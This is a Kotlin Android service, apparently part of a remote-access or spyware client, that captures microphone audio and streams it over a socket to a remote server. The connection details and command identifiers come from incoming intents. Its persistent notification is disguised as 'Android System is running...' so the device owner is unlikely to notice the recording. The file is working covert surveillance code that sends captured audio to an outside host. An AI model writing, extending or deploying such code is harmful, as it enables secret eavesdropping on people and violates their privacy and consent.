package com.client.services.other

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.client.services.client.sendMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.io.IOException
import java.io.OutputStream
import java.net.Socket

class MicStreamingService : Service() {

    private val TAG = "MicStreamingService"
    private var SERVER_IP = "YOUR_SERVER_IP" // Replace with your server's IP address
    private var SERVER_PORT = 12345 // Replace with your server's port
    private val SAMPLE_RATE = 44100
    private val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO  // Using microphone input configuration
    private var AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    private var bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)

    private var audioRecord: AudioRecord? = null
    private var socket: Socket? = null
    private var isStreaming = false
    private var streamingJob: Job? = null

    private var serverID = ""
    private var messageID = ""

    private val notificationChannelId = "mic_streaming_channel"
    private var notificationChannel: NotificationChannel? = null
    private var notificationManager: NotificationManager? = null
    private var notification: Notification? = null

    companion object {
        const val ACTION_STOP_MIC_STREAMING_SERVICE = "com.client.services.other.MicStreamingService.STOP_MIC_STREAMING_SERVICE"
    }

    private fun createAudioStreamingNotificationChannel(context: Context?) {
        if (notificationChannel == null) {
            notificationChannel = NotificationChannel(
                notificationChannelId,
                "MicStreamingChannel",
                NotificationManager.IMPORTANCE_HIGH
            )
            notificationManager =
                context?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager!!.createNotificationChannel(notificationChannel!!)
        }
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_STOP_MIC_STREAMING_SERVICE) {
                Log.d(TAG, "stop streaming received")
                try {
                    stopStreaming()
                } catch (ex: Exception) {
                    ex.printStackTrace()
                } finally {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_STOP_MIC_STREAMING_SERVICE),
                Context.RECEIVER_EXPORTED
            )
        } else {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_STOP_MIC_STREAMING_SERVICE)
            )
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createAudioStreamingNotificationChannel(this)
        notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentText("Android System is running...")
            .setContentTitle("Android System")
            .build()
        startForeground(2, notification)
        Log.d(TAG, "service started")

        // Get connection parameters from the intent
        SERVER_IP = intent!!.getStringExtra("ServerIP")!!
        SERVER_PORT = intent.getIntExtra("ServerPort", -1)
        serverID = intent.getStringExtra("ServerID")!!
        messageID = intent.getStringExtra("MessageID")!!
        AUDIO_FORMAT = intent.getIntExtra("AudioFormat", -1)

        if (SERVER_PORT == -1 || AUDIO_FORMAT == -1) {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        } else {
            startStreaming()
        }
        return START_REDELIVER_INTENT
    }

    private fun startStreaming() {
        if (isStreaming) {
            sendMessage(
                this,
                false,
                "START_STREAMING_MIC: Operation failed: already streaming",
                messageID, serverID
            )
            return
        }
        if (ActivityCompat.checkSelfPermission(
                this@MicStreamingService,
                Manifest.permission.RECORD_AUDIO
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            isStreaming = true
            streamingJob = CoroutineScope(Dispatchers.IO).launch {
                try {
                    // Connect to the server
                    socket = Socket(SERVER_IP, SERVER_PORT)
                    Log.d(
                        TAG,
                        "Connected to server: ${socket?.inetAddress?.hostAddress}:${socket?.port}"
                    )
                    sendMessage(
                        this@MicStreamingService,
                        false,
                        "START_STREAMING_MIC: Operation completed successfully",
                        messageID, serverID
                    )

                    // Prepare AudioRecord to capture microphone audio
                    audioRecord = AudioRecord(
                        MediaRecorder.AudioSource.MIC,
                        SAMPLE_RATE,
                        CHANNEL_CONFIG,
                        AUDIO_FORMAT,
                        bufferSize
                    )
                    if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                        Log.e(TAG, "AudioRecord initialization failed")
                        return@launch
                    }
                    audioRecord?.startRecording()

                    // Get the output stream from the socket
                    val outputStream: OutputStream = socket!!.getOutputStream()

                    // Buffer for audio data
                    val buffer = ByteArray(bufferSize)
                    while (isStreaming) {
                        val readBytes = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                        if (readBytes > 0) {
                            outputStream.write(buffer, 0, readBytes)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error during audio streaming: ${e.message}")
                    sendMessage(
                        this@MicStreamingService,
                        false,
                        "START_STREAMING_MIC: Operation failed - ${e.localizedMessage}",
                        messageID, serverID
                    )
                } finally {
                    stopStreaming()
                }
            }
        } else {
            sendMessage(
                this,
                false,
                "START_STREAMING_MIC: Operation failed - permission not granted"
            )
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        streamingJob?.cancel()
        streamingJob = null

        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping AudioRecord: ${e.message}")
        }
        audioRecord = null

        try {
            socket?.close()
        } catch (e: IOException) {
            Log.e(TAG, "Error closing socket: ${e.message}")
        }
        socket = null
        Log.d(TAG, "Streaming stopped.")
        sendMessage(
            this,
            false,
            "START_STREAMING_MIC: Streaming stopped",
            messageID, serverID
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
        stopStreaming()
    }
}
